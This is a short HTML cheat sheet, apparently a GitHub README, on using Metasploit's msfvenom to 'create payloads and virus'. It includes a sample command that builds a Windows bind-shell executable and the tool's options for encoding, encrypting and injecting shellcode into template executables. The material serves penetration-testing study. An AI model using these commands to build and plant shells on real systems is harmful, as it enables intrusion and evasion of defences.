<img src="https://github.com/dewebdes/CYBER-MILITARY-GERMANY/blob/master/Metasploit/msfvenom/msfvenom.jpg" />
<h1>Create Payloads and Virus</h1>
<h2>MSFVenom is new and combine msfpayload, encrypts & others together</h2>
<h3>Sample usage</h3>
<code>msfvenom -p windows/shell_bind_tcp LPORT=1337 LHOST=<IP> -f exe -o bindshell.exe</code>
<p>
<h3>Get the list of <b>msfvenom</b> Algorithms & Options, all for all options and others for filter results </h3>
<code>
msfvenom -l [payloads,encoders,nops,platforms,archs,encrypt,formats,all]
</code>
</p>
<p>
<code>msfvenom -p linux/x86/shell_bind_ipv6_tcp --list-options</code>
	<br><b>show target payload options</b>
</p>
<p>
	<code>msfvenom -f [format-name]</code>
<h4>Raw Payload -> Encoder -> Formatting -> Output</h4>
</p>	
<p>
	-e, --encoder         <encoder>  The encoder to use (use --list encoders to list)<br>
        &tab;--sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string<br>
        --smallest                   Generate the smallest possible payload using all available encoders<br>
        <a href="https://www.linkedin.com/posts/kave-eyni-08060b59_5-common-encryption-algorithms-and-the-unbreakables-activity-6674037546470780928-GkvA">--encrypt</a>         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)<br>
        --encrypt-key     <value>    A key to be used for --encrypt<br>
        --encrypt-iv      <value>    An initialization vector for --encrypt<br>
	</p>
	<p>
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)<br>
        --platform        <platform> The platform for --payload (use --list platforms to list)<br>
		</p>
		<p>
    -o, --out             <path>     Save the payload to a file
			</p>
    <p>
	    -b, <a href="https://www.linkedin.com/posts/kave-eyni-08060b59_bad-char-hacking-activity-6674042570320039936-8InL">--bad-chars</a>       <list>     Characters to avoid example: '\x00\xff'
	    </p>
	    <p>
    -n, <a href="https://www.linkedin.com/posts/kave-eyni-08060b59_blackhat-hacker-lessons-activity-6674044482788450304-mXPf">--nopsled</a>         <length>   Prepend a nopsled of [length] size on to the payload<br>
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
		    </p>
    <p>
	    -s, --space           <length>   The maximum size </p>
	    <p>-c, --add-code        <path>     Specify an additional win32 shellcode file to include</p>
    <p>-x, --template        <path>     Specify a custom executable file to use as a template</p>
    <p>-k, --keep                       Preserve the --template behaviour and inject the payload as a new thread</p>
    <p>-v, <a href="https://www.linkedin.com/posts/kave-eyni-08060b59_blackhat-hacking-lessons-activity-6674051666335158272-ZrT2">--var-name</a>        <value>    Specify a custom variable name to use for certain output formats</p>
    <p>-t, <a href="https://www.linkedin.com/posts/kave-eyni-08060b59_rapid7metasploit-framework-activity-6674053418291732480-eaeS">--timeout</a>         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)</p>
    <p>-h, --help                       Show this message</p>
